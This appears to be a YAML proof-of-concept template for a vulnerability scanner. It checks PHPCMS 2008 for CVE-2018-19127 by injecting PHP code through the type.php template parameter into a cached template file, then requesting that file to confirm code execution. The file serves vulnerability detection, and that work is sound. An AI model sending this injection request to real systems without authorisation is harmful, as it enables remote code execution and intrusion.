name: poc-yaml-phpcms-cve-2018-19127
set:
    random: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /type.php?template=tag_(){}%3b@unlink(file)%3becho md5($_GET[1])%3b{//../rss
            follow_redirects: true
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /data/cache_template/rss.tpl.php?1={{random}}
            follow_redirects: true
        expression: response.body.bcontains(bytes(md5(string(random))))
expression: r0() && r1()
detail:
    links:
        - https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
